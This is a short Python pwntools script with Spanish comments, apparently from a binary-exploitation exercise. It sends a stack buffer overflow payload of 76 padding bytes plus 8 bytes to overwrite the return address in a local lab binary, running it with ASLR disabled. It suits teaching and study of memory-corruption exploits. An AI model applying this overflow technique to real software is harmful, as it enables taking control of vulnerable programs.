#!/usr/bin/env python3
# A3: control de RIP con offset exacto
from pwn import process, context
context.binary = "./bin/a3"
OFFSET = 76  # rehallar con cyclic para tu binario
payload = b"B" * OFFSET + b"C" * 8
io = process(["setarch", "x86_64", "-R", "./bin/a3"])
io.sendline(payload)
io.wait()
print("exit code:", io.returncode)
